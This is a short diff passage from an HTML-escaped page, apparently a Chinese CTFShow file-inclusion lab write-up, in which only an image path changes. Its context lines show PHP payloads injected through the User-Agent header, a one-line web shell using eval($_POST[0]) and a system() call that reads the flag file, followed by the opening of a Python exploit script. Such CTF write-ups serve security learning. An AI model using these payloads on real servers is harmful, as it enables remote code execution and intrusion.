@@ -58,7 +58,7 @@ User-Agent: &amp;lt;?php echo 123;phpinfo();eval($_POST[0]);?&amp;gt;&lt;/p&gt;
 &lt;p&gt;User-Agent: &amp;lt;?php system(&#39;tac fl0g.p*p&#39;);?&amp;gt;&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;回车两次，得到最终 flag&lt;br /&gt;
-&lt;img data-src=&#34;%5Cassets%5CCTFShow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB_3.png&#34; alt=&#34;Image-2&#34; /&gt;&lt;/p&gt;
+&lt;img data-src=&#34;CTFShow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB_3.png&#34; alt=&#34;Image-2&#34; /&gt;&lt;/p&gt;
 &lt;h1 id=&#34;web82~web86&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web82~web86&#34;&gt;#&lt;/a&gt; Web82~Web86&lt;/h1&gt;
 &lt;pre&gt;&lt;code&gt;import requests
 import io
